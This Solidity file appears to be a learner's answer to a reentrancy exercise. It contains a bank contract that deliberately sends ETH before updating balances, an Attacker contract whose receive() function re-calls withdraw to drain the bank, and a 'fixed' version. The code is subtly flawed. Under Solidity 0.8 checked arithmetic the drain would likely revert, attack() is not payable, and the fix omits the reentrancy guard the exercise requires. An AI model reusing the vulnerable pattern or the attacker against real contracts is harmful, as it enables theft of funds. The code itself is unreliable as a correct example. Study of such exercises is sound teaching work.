// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

/*
Exercise 1: Reentrancy
This one is two parts.

Part 1 — Write the vulnerable contract
Write a contract called VulnerableBank that:

Lets anyone deposit ETH
Lets anyone withdraw their balance
Has the reentrancy bug baked in — meaning it sends ETH before updating the balance


Part 2 — Write the attacker contract
Write a separate contract called Attacker that:

Has a function to attack the VulnerableBank
Uses a receive() function to keep calling withdraw during the same transaction
Drains the bank


Then Part 3 — Fix it
Write SafeBank — same as VulnerableBank but fixed using:

CEI pattern
A reentrancy guard modifier
*/

error notEnough();

contract VunlerableBank {
    mapping(address => uint256) public balanceOf;

    function deposite() payable public {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        if(balanceOf[msg.sender] < amount) revert notEnough();

        (bool success, ) = msg.sender.call{value: amount}(""); 
        require(success, "failed transaction");

        balanceOf[msg.sender] -= amount; 
    }
}

contract Attacker {
    VunlerableBank public target;  
    uint256 public starter = 1 ether;

    constructor(address _target) {
        target = VunlerableBank(_target);
    }

    function attack() external {
        target.deposite{value: starter}();

        target.withdraw(starter);
    }

    receive() external payable {
        if(address(target).balance >= starter){
            target.withdraw(starter);
        }
    }
}

contract safeBank {
     mapping(address => uint256) public balanceOf;

    function deposite() payable public {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        if(balanceOf[msg.sender] < amount) revert notEnough();
        
        balanceOf[msg.sender] -= amount; 

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "failed transaction");
    }
}